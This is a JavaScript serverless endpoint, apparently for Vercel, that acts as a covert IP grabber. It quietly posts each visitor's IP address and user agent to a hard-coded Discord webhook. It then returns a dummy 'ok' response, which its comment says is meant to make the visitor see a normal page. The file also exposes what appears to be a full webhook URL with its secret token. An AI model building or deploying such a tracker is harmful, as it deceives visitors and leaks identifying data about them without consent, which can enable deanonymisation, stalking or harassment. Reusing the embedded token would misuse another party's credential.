export default async function handler(req, res) {
    // Extract IP and user agent from Vercel's request headers
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';

    const webhookUrl = "https://discord.com/api/webhooks/1552823988768473099/8k0Q49Jo4UIZypudP7wULDs4ipYD2GM6fcK7--bQ9MoQ0FKKXnFH_s1LvxQeYeSKspLt";

    const payload = {
        embeds: [{
            title: "🔍 New Visitor Logged",
            color: 3447003,
            fields: [
                { name: "IP Address", value: `\`${clientIp}\``, inline: false },
                { name: "User Agent", value: `\`${userAgent}\``, inline: false }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Webhook error:", e);
    }

    // Return a dummy response so the user sees a normal page
    return res.status(200).json({ status: 'ok' });
}